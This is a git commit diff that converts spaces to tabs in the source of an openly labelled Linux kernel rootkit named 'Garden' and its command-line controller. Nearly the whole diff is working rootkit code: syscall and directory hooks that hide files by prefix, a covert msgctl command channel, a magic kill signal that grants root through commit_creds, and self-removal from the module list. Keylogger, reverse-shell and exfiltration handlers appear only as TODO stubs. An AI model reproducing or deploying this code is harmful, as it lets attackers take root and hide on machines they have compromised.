97b70b4338136ac179d7c6a8bac826ac48d74fb4
Aaron Lichtman <aaronlichtman@gmail.com>
2019-04-16 07:44:55 -0400

    Convert spaces to tabs

--- rootkit/rootkit.c
+++ rootkit/rootkit.c
@@ -36,9 +36,9 @@ MODULE_LICENSE("GPL");  // So the kernel doesn't complain about proprietary code
 
 #if (LINUX_VERSION_CODE >= KERNEL_VERSION(4, 15, 0))
 typedef struct legacy_timer_emu {
-    struct timer_list t;
-    void (*function)(unsigned long);
-    unsigned long data;
+	struct timer_list t;
+	void (*function)(unsigned long);
+	unsigned long data;
 } _timer;
 #else
 typedef struct timer_list _timer;
@@ -55,8 +55,8 @@ typedef struct timer_list _timer;
 
 // This action_task struct is what is actually passed to the LKM.
 typedef struct action_task {
-    int func_code;
-    char *file_hide_str;
+	int func_code;
+	char *file_hide_str;
 } action_task;
 
 /**
@@ -97,43 +97,43 @@ static void do_something_on_interval(unsigned long data);
  */
 
 void log_info(const char *message) {
-    printk(KERN_INFO "GARDEN: %s", message);
+	printk(KERN_INFO "GARDEN: %s", message);
 }
 
 void log_error(const char *message) {
-    printk(KERN_ERR "GARDEN: %s", message);
+	printk(KERN_ERR "GARDEN: %s", message);
 }
 
 /**
  * Handler for incoming action_tasks. Frees task memory if it doesn't return.
  */
 int handle_task(action_task *task) {
-    printk(KERN_EMERG "Handling function code: %d\n", task->func_code);
-    switch (task->func_code) {
-        case GET_ROOT:
-            return get_root();
-        case KEYLOGGER_ENABLE:
-            // TODO
-            break;
-        case KEYLOGGER_DISABLE:
-            // TODO
-            break;
-        case FILE_HIDE_ADD:
-            // TODO
-            break;
-        case FILE_HIDE_RM:
-            // TODO
-            break;
-        case FILE_HIDE_SHOW:
-            // TODO: print contents of hidden_file_prefix array
-            break;
-        case REVERSE_TCP_SHELL:
-            // TODO
-            break;
-        default:
-            printk(KERN_ERR "Unexpected function code. This shouldn't be possible.\n");
-            return -1;
-    };
+	printk(KERN_EMERG "Handling function code: %d\n", task->func_code);
+	switch (task->func_code) {
+		case GET_ROOT:
+			return get_root();
+		case KEYLOGGER_ENABLE:
+			// TODO
+			break;
+		case KEYLOGGER_DISABLE:
+			// TODO
+			break;
+		case FILE_HIDE_ADD:
+			// TODO
+			break;
+		case FILE_HIDE_RM:
+			// TODO
+			break;
+		case FILE_HIDE_SHOW:
+			// TODO: print contents of hidden_file_prefix array
+			break;
+		case REVERSE_TCP_SHELL:
+			// TODO
+			break;
+		default:
+			printk(KERN_ERR "Unexpected function code. This shouldn't be possible.\n");
+			return -1;
+	};
 	return 0;
 }
 
@@ -144,19 +144,19 @@ int handle_task(action_task *task) {
  */
 KHOOK_EXT(long, __x64_sys_msgctl, const struct pt_regs *);
 static long khook___x64_sys_msgctl(const struct pt_regs *regs) {
-    action_task *task;
-    int error;
+	action_task *task;
+	int error;
 
-    if (regs->di == INT_MAX && regs->si == INT_MAX) {
-        printk(KERN_EMERG "sys_msgctl --Incoming command\n");
-        task = kmalloc(MAX_TASK_SIZE + 1, GFP_KERNEL);
-        copy_from_user(task, (const void *)regs->dx, MAX_TASK_SIZE);
-        error = handle_task(task);
-        kfree(task);
-        return error;
-    } else {
-        return KHOOK_ORIGIN(__x64_sys_msgctl, regs);
-    }
+	if (regs->di == INT_MAX && regs->si == INT_MAX) {
+		printk(KERN_EMERG "sys_msgctl --Incoming command\n");
+		task = kmalloc(MAX_TASK_SIZE + 1, GFP_KERNEL);
+		copy_from_user(task, (const void *)regs->dx, MAX_TASK_SIZE);
+		error = handle_task(task);
+		kfree(task);
+		return error;
+	} else {
+		return KHOOK_ORIGIN(__x64_sys_msgctl, regs);
+	}
 }
 
 /**
@@ -168,77 +168,77 @@ static long khook___x64_sys_msgctl(const struct pt_regs *regs) {
  * If this method returns true, the file in question should be hidden.
  */
 static bool should_hide_file(const char *name) {
-    if (hidden_file_prefix && !strncmp(name, hidden_file_prefix, strlen(hidden_file_prefix))) {
-        printk(KERN_INFO "Hiding: %s\n", name);
-        return true;
-    }
-    return false;
+	if (hidden_file_prefix && !strncmp(name, hidden_file_prefix, strlen(hidden_file_prefix))) {
+		printk(KERN_INFO "Hiding: %s\n", name);
+		return true;
+	}
+	return false;
 }
 
 KHOOK_EXT(int, fillonedir, void *, const char *, int, loff_t, u64, unsigned int);
 static int khook_fillonedir(void *__buf, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type) {
-    if (should_hide_file(name)) {
-        return 0;
-    }
-    return KHOOK_ORIGIN(fillonedir, __buf, name, namlen, offset, ino, d_type);
+	if (should_hide_file(name)) {
+		return 0;
+	}
+	return KHOOK_ORIGIN(fillonedir, __buf, name, namlen, offset, ino, d_type);
 }
 
 KHOOK_EXT(int, filldir, void *, const char *, int, loff_t, u64, unsigned int);
 static int khook_filldir(void *__buf, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type) {
-    if (should_hide_file(name)) {
-        return 0;
-    }
-    return KHOOK_ORIGIN(filldir, __buf, name, namlen, offset, ino, d_type);
+	if (should_hide_file(name)) {
+		return 0;
+	}
+	return KHOOK_ORIGIN(filldir, __buf, name, namlen, offset, ino, d_type);
 }
 
 KHOOK_EXT(int, filldir64, void *, const char *, int, loff_t, u64, unsigned int);
 static int khook_filldir64(void *__buf, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type) {
-    if (should_hide_file(name)) {
-        return 0;
-    }
-    return KHOOK_ORIGIN(filldir64, __buf, name, namlen, offset, ino, d_type);
+	if (should_hide_file(name)) {
+		return 0;
+	}
+	return KHOOK_ORIGIN(filldir64, __buf, name, namlen, offset, ino, d_type);
 }
 
 KHOOK_EXT(int, compat_fillonedir, void *, const char *, int, loff_t, u64, unsigned int);
 static int khook_compat_fillonedir(void *__buf, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type) {
-    if (should_hide_file(name)) {
-        return 0;
-    }
-    return KHOOK_ORIGIN(compat_fillonedir, __buf, name, namlen, offset, ino, d_type);
+	if (should_hide_file(name)) {
+		return 0;
+	}
+	return KHOOK_ORIGIN(compat_fillonedir, __buf, name, namlen, offset, ino, d_type);
 }
 
 KHOOK_EXT(int, compat_filldir, void *, const char *, int, loff_t, u64, unsigned int);
 static int khook_compat_filldir(void *__buf, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type) {
-    if (should_hide_file(name)) {
-        return 0;
-    }
-    return KHOOK_ORIGIN(compat_filldir, __buf, name, namlen, offset, ino, d_type);
+	if (should_hide_file(name)) {
+		return 0;
+	}
+	return KHOOK_ORIGIN(compat_filldir, __buf, name, namlen, offset, ino, d_type);
 }
 
 KHOOK_EXT(struct dentry *, __d_lookup, const struct dentry *, const struct qstr *);
 struct dentry *khook___d_lookup(const struct dentry *parent, const struct qstr *name) {
-    if (should_hide_file(name->name)) {
-        return NULL;
-    }
-    return KHOOK_ORIGIN(__d_lookup, parent, name);
+	if (should_hide_file(name->name)) {
+		return NULL;
+	}
+	return KHOOK_ORIGIN(__d_lookup, parent, name);
 }
 
 /**
  * Drops the current user into a root shell.
  */
 static int get_root(void) {
-    struct cred *root_creds;
-    printk(KERN_EMERG "One root coming right up.");
-    root_creds = prepare_kernel_cred(NULL);
-    return commit_creds(root_creds);
+	struct cred *root_creds;
+	printk(KERN_EMERG "One root coming right up.");
+	root_creds = prepare_kernel_cred(NULL);
+	return commit_creds(root_creds);
 }
 
 KHOOK_EXT(long, __x64_sys_kill, const struct pt_regs *);
 static long khook___x64_sys_kill(const struct pt_regs *regs) {
-    if (regs->di == MAGIC_ROOT_NUM) {
-        return get_root();
-    }
-    return KHOOK_ORIGIN(__x64_sys_kill, regs);
+	if (regs->di == MAGIC_ROOT_NUM) {
+		return get_root();
+	}
+	return KHOOK_ORIGIN(__x64_sys_kill, regs);
 }
 
 /**
@@ -248,37 +248,37 @@ static long khook___x64_sys_kill(const struct pt_regs *regs) {
 
 #if (LINUX_VERSION_CODE >= KERNEL_VERSION(4, 15, 0))
 static void legacy_timer_function_wrapper(struct timer_list *timer) {
-    struct legacy_timer_emu *legacy_timer = from_timer(legacy_timer, timer, t);
-    // NOTE: legacy_timer->data is currently always NULL, but may not be in the future.
-    legacy_timer->function(legacy_timer->data);
+	struct legacy_timer_emu *legacy_timer = from_timer(legacy_timer, timer, t);
+	// NOTE: legacy_timer->data is currently always NULL, but may not be in the future.
+	legacy_timer->function(legacy_timer->data);
 }
 #endif
 
 __inline void timer_init_wrapper(_timer *timer, void *func) {
-    timer->data = 0;
-    timer->function = func;
+	timer->data = 0;
+	timer->function = func;
 #if (LINUX_VERSION_CODE >= KERNEL_VERSION(4, 15, 0))
-    timer_setup(&timer->t, legacy_timer_function_wrapper, 0);
+	timer_setup(&timer->t, legacy_timer_function_wrapper, 0);
 #else
-    init_timer(timer);
+	init_timer(timer);
 #endif
 }
 
 __inline static void set_timer(_timer *timer) {
-    unsigned long expires = jiffies + msecs_to_jiffies(POLLING_INTERVAL);
+	unsigned long expires = jiffies + msecs_to_jiffies(POLLING_INTERVAL);
 #if (LINUX_VERSION_CODE >= KERNEL_VERSION(4, 15, 0))
-    mod_timer(&timer->t, expires);
+	mod_timer(&timer->t, expires);
 #else
-    mod_timer(timer, expires);
+	mod_timer(timer, expires);
 #endif
-    // printk("Timer configured to go off at %lu jiffies, in %lu msecs\n", expires, msecs_to_jiffies(POLLING_INTERVAL));
+	// printk("Timer configured to go off at %lu jiffies, in %lu msecs\n", expires, msecs_to_jiffies(POLLING_INTERVAL));
 }
 
 __inline static void timer_cleanup_wrapper(_timer *timer) {
 #if (LINUX_VERSION_CODE >= KERNEL_VERSION(4, 15, 0))
-    del_timer_sync(&timer->t);
+	del_timer_sync(&timer->t);
 #else
-    del_timer_sync(timer);
+	del_timer_sync(timer);
 #endif
 }
 
@@ -288,39 +288,39 @@ __inline static void timer_cleanup_wrapper(_timer *timer) {
  * NOTE: The data parameter is required in order for this to compile.
  */
 static void do_something_on_interval(unsigned long data) {
-    // TODO: Exfiltrate data.
-    set_timer(&polling_timer);
+	// TODO: Exfiltrate data.
+	set_timer(&polling_timer);
 }
 
 /**
  * Rootkit module initialization.
  */
 static int __init rootkit_init(void) {
-    printk(KERN_EMERG "Initializing rootkit...\n");
-    khook_init();
+	printk(KERN_EMERG "Initializing rootkit...\n");
+	khook_init();
 
-    printk(KERN_EMERG "Initializing timer...\n");
-    timer_init_wrapper(&polling_timer, do_something_on_interval);
-    set_timer(&polling_timer);
+	printk(KERN_EMERG "Initializing timer...\n");
+	timer_init_wrapper(&polling_timer, do_something_on_interval);
+	set_timer(&polling_timer);
 
-    if (block_removal) {
-        printk(KERN_EMERG "Blocking removal and hiding rootkit...\n");
-        list_del_init(&__this_module.list);
-        kobject_del(&THIS_MODULE->mkobj.kobj);
-    }
+	if (block_removal) {
+		printk(KERN_EMERG "Blocking removal and hiding rootkit...\n");
+		list_del_init(&__this_module.list);
+		kobject_del(&THIS_MODULE->mkobj.kobj);
+	}
 
-    // Gotta make the compiler happy.
-    do_something_on_interval(0);
-    return 0;
+	// Gotta make the compiler happy.
+	do_something_on_interval(0);
+	return 0;
 }
 
 /**
  * Called when $ rmmod is executed. Cleans up rootkit nicely.
  */
 static void __exit rootkit_exit(void) {
-    printk(KERN_EMERG "rmmod called. Cleaning up rootkit.");
-    khook_cleanup();
-    timer_cleanup_wrapper(&polling_timer);
+	printk(KERN_EMERG "rmmod called. Cleaning up rootkit.");
+	khook_cleanup();
+	timer_cleanup_wrapper(&polling_timer);
 }
 
 module_init(rootkit_init);
--- rootkit/rootkit_command.c
+++ rootkit/rootkit_command.c
@@ -48,28 +48,28 @@
  */
 // TODO: Extract this to an h file to avoid duplication.
 typedef struct function_code {
-    int get_root;
-    int keylogger_enable;
-    int keylogger_disable;
-    int file_hide_add;
-    int file_hide_rm;
-    int file_hide_show;
-    int reverse_tcp_shell;
+	int get_root;
+	int keylogger_enable;
+	int keylogger_disable;
+	int file_hide_add;
+	int file_hide_rm;
+	int file_hide_show;
+	int reverse_tcp_shell;
 } function_code;
 
 function_code functionCode = {
-    .get_root = 0,
-    .keylogger_enable = 1,
-    .keylogger_disable = 2,
-    .file_hide_add = 3,
-    .file_hide_rm = 4,
-    .file_hide_show = 5,
-    .reverse_tcp_shell = 6};
+	.get_root = 0,
+	.keylogger_enable = 1,
+	.keylogger_disable = 2,
+	.file_hide_add = 3,
+	.file_hide_rm = 4,
+	.file_hide_show = 5,
+	.reverse_tcp_shell = 6};
 
 // This action_task struct is what is actually passed to the LKM.
 typedef struct action_task {
-    int func_code;
-    char *file_hide_str;
+	int func_code;
+	char *file_hide_str;
 } action_task;
 
 /**
@@ -77,39 +77,39 @@ typedef struct action_task {
  */
 
 void print_red(const char *text) {
-    printf("%s %s %s", RED, text, RESET);
+	printf("%s %s %s", RED, text, RESET);
 }
 
 void print_green(const char *text) {
-    printf("%s %s %s", GREEN, text, RESET);
+	printf("%s %s %s", GREEN, text, RESET);
 }
 
 void print_blue(const char *text) {
-    printf("%s %s %s", BLUE, text, RESET);
-    //	printf("%s %s %s", CYAN, text, RESET);
+	printf("%s %s %s", BLUE, text, RESET);
+	//	printf("%s %s %s", CYAN, text, RESET);
 }
 
 void print_banner() {
-    char *banner =
-        "\n\t ██████╗  █████╗ ██████╗ ██████╗ ███████╗███╗   ██╗\n \
+	char *banner =
+		"\n\t ██████╗  █████╗ ██████╗ ██████╗ ███████╗███╗   ██╗\n \
 \t██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔════╝████╗  ██║\n \
 \t██║  ███╗███████║██████╔╝██║  ██║█████╗  ██╔██╗ ██║\n \
 \t██║   ██║██╔══██║██╔══██╗██║  ██║██╔══╝  ██║╚██╗██║\n \
 \t╚██████╔╝██║  ██║██║  ██║██████╔╝███████╗██║ ╚████║\n \
 \t ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═══╝\n";
 
-    print_green(banner);
+	print_green(banner);
 }
 
 void print_usage() {
-    print_green("\nWelcome to the Garden.\n--------------\n");
-    print_green("\t/garden root\t\t\t\t - gives you root.\n");
-    print_green("\t/garden keylogger [enable/disable]\t - toggles the keylogger.\n");
-    print_green("\t/garden hide add PREFIX\t\t\t - adds PREFIX to the hide list.\n");
-    print_green("\t/garden hide rm PREFIX\t\t\t - removes PREFIX from the hide list.\n");
-    print_green("\t/garden hide ls\t\t\t\t - shows prefixes in the hide list.\n");
-    print_green("\t/garden rev_tcp\t\t\t\t - opens a reverse shell using the IP and PORT configured during setup.\n\n");
-    exit(0);
+	print_green("\nWelcome to the Garden.\n--------------\n");
+	print_green("\t/garden root\t\t\t\t - gives you root.\n");
+	print_green("\t/garden keylogger [enable/disable]\t - toggles the keylogger.\n");
+	print_green("\t/garden hide add PREFIX\t\t\t - adds PREFIX to the hide list.\n");
+	print_green("\t/garden hide rm PREFIX\t\t\t - removes PREFIX from the hide list.\n");
+	print_green("\t/garden hide ls\t\t\t\t - shows prefixes in the hide list.\n");
+	print_green("\t/garden rev_tcp\t\t\t\t - opens a reverse shell using the IP and PORT configured during setup.\n\n");
+	exit(0);
 }
 
 /**
@@ -117,22 +117,22 @@ void print_usage() {
  * exits (inside print_usage).
  */
 bool check_for_subarg(int idx, char *argv[]) {
-    if (!argv[idx]) {
-        print_usage();
-    }
-    return true;
+	if (!argv[idx]) {
+		print_usage();
+	}
+	return true;
 }
 
 void handle_get_root(char *base_cmd, action_task *action) {
-    if (!strcmp(base_cmd, ROOT)) {
-        action->func_code = functionCode.get_root;
-    }
+	if (!strcmp(base_cmd, ROOT)) {
+		action->func_code = functionCode.get_root;
+	}
 }
 
 void handle_reverse_tcp_shell(char *base_cmd, action_task *action) {
-    if (!strcmp(base_cmd, REVERSE_TCP_SHELL)) {
-        action->func_code = functionCode.reverse_tcp_shell;
-    }
+	if (!strcmp(base_cmd, REVERSE_TCP_SHELL)) {
+		action->func_code = functionCode.reverse_tcp_shell;
+	}
 }
 
 /**
@@ -145,13 +145,13 @@ void handle_reverse_tcp_shell(char *base_cmd, action_task *action) {
  * 	$ keylogger disable
  */
 void handle_keylogger_action(char *base_cmd, char *subarg, action_task *action) {
-    if (!strcmp(base_cmd, KEYLOGGER)) {
-        if (!strcmp(subarg, ENABLE)) {  // Keylogger enable
-            action->func_code = functionCode.keylogger_enable;
-        } else if (!strcmp(subarg, DISABLE)) {  // Keylogger disable
-            action->func_code = functionCode.keylogger_disable;
-        }
-    }
+	if (!strcmp(base_cmd, KEYLOGGER)) {
+		if (!strcmp(subarg, ENABLE)) {  // Keylogger enable
+			action->func_code = functionCode.keylogger_enable;
+		} else if (!strcmp(subarg, DISABLE)) {  // Keylogger disable
+			action->func_code = functionCode.keylogger_disable;
+		}
+	}
 }
 
 /**
@@ -161,20 +161,20 @@ void handle_keylogger_action(char *base_cmd, char *subarg, action_task *action) 
  * 	$ hide rm FILE
  */
 void handle_file_hide_action(char *base_cmd, char *subarg, char *argv[], action_task *action) {
-    if (!strcmp(base_cmd, FILE_HIDE)) {
-        if (!strcmp(subarg, SHOW)) {
-            action->func_code = functionCode.file_hide_show;
-        } else if (check_for_subarg(3, argv)) {  // Make sure the 3rd arg in $ hide [add/rm] FILE exists
-            if (!strcmp(subarg, ADD)) {
-                action->func_code = functionCode.file_hide_add;
-            } else if (!strcmp(subarg, REMOVE)) {
-                action->func_code = functionCode.file_hide_rm;
-            } else {
-                print_usage();
-            }
-            action->file_hide_str = argv[3];
-        }
-    }
+	if (!strcmp(base_cmd, FILE_HIDE)) {
+		if (!strcmp(subarg, SHOW)) {
+			action->func_code = functionCode.file_hide_show;
+		} else if (check_for_subarg(3, argv)) {  // Make sure the 3rd arg in $ hide [add/rm] FILE exists
+			if (!strcmp(subarg, ADD)) {
+				action->func_code = functionCode.file_hide_add;
+			} else if (!strcmp(subarg, REMOVE)) {
+				action->func_code = functionCode.file_hide_rm;
+			} else {
+				print_usage();
+			}
+			action->file_hide_str = argv[3];
+		}
+	}
 }
 
 /**
@@ -185,16 +185,16 @@ void handle_file_hide_action(char *base_cmd, char *subarg, char *argv[], action_
  * Returns 0 if successfully communicated, -1 otherwise.
  */
 int communicate_with_lkm(action_task *rootkit_action) {
-    struct msqid_ds messenger;
-    memset(&messenger, 0, sizeof(struct msqid_ds));
+	struct msqid_ds messenger;
+	memset(&messenger, 0, sizeof(struct msqid_ds));
 
-    if (msgctl(INT_MAX, INT_MAX, (struct msqid_ds *)rootkit_action) == 0) {
-        print_green("Communication OK.\n");
-        return 0;
-    } else {
-        print_red("Communication failed.\n");
-        return -1;
-    }
+	if (msgctl(INT_MAX, INT_MAX, (struct msqid_ds *)rootkit_action) == 0) {
+		print_green("Communication OK.\n");
+		return 0;
+	} else {
+		print_red("Communication failed.\n");
+		return -1;
+	}
 }
 
 /**
@@ -202,57 +202,57 @@ int communicate_with_lkm(action_task *rootkit_action) {
  * Otherwise, returns false.
  */
 bool execute_action_if_possible(action_task *action) {
-    if (action->func_code != -1) {
-        // printf("Function code: %d, str: %s\n", action->func_code, action->file_hide_str);
-        if (communicate_with_lkm(action) == 0) {
-            if (action->func_code == functionCode.get_root) {
-                const char *bash = "/bin/bash";
-                char *const argv[3] = {bash, NULL};
-                char *const envp[1] = {NULL};
-                execve(bash, argv, envp);
-            }
-        }
-        return true;
-    } else {
-        return false;
-    }
+	if (action->func_code != -1) {
+		// printf("Function code: %d, str: %s\n", action->func_code, action->file_hide_str);
+		if (communicate_with_lkm(action) == 0) {
+			if (action->func_code == functionCode.get_root) {
+				const char *bash = "/bin/bash";
+				char *const argv[3] = {bash, NULL};
+				char *const envp[1] = {NULL};
+				execve(bash, argv, envp);
+			}
+		}
+		return true;
+	} else {
+		return false;
+	}
 }
 
 /**
  * CLI for interacting with the rootkit and interfacing with the kernel module.
  */
 int main(int argc, char *argv[]) {
-    print_banner();
+	print_banner();
 
-    // No args entered. Display help menu.
-    if (argc == 1 || !strcmp(argv[1], "-h") || !strcmp(argv[1], "--help")) {
-        print_usage();
-        return 0;
-    }
+	// No args entered. Display help menu.
+	if (argc == 1 || !strcmp(argv[1], "-h") || !strcmp(argv[1], "--help")) {
+		print_usage();
+		return 0;
+	}
 
-    // Set up action_task. This is what will be passed to the LKM to make
-    // things happen. Set the func_code to -1 initially so we can detect failure
-    // to set any options later.
-    action_task action;
-    memset(&action, 0, sizeof(action));
-    action.func_code = -1;
+	// Set up action_task. This is what will be passed to the LKM to make
+	// things happen. Set the func_code to -1 initially so we can detect failure
+	// to set any options later.
+	action_task action;
+	memset(&action, 0, sizeof(action));
+	action.func_code = -1;
 
-    // Parse single arg commands
-    char *base_cmd = argv[1];
-    handle_get_root(base_cmd, &action);
-    handle_reverse_tcp_shell(base_cmd, &action);
-    execute_action_if_possible(&action);
+	// Parse single arg commands
+	char *base_cmd = argv[1];
+	handle_get_root(base_cmd, &action);
+	handle_reverse_tcp_shell(base_cmd, &action);
+	execute_action_if_possible(&action);
 
-    // Parse double arg commands
-    check_for_subarg(2, argv);
-    char *subarg = argv[2];
-    handle_keylogger_action(base_cmd, subarg, &action);
+	// Parse double arg commands
+	check_for_subarg(2, argv);
+	char *subarg = argv[2];
+	handle_keylogger_action(base_cmd, subarg, &action);
 
-    // Parse triple arg commands
-    handle_file_hide_action(base_cmd, subarg, argv, &action);
-    execute_action_if_possible(&action);
+	// Parse triple arg commands
+	handle_file_hide_action(base_cmd, subarg, argv, &action);
+	execute_action_if_possible(&action);
 
-    // If we get here, no valid command has been entered.
-    print_usage();
-    return 0;
+	// If we get here, no valid command has been entered.
+	print_usage();
+	return 0;
 }
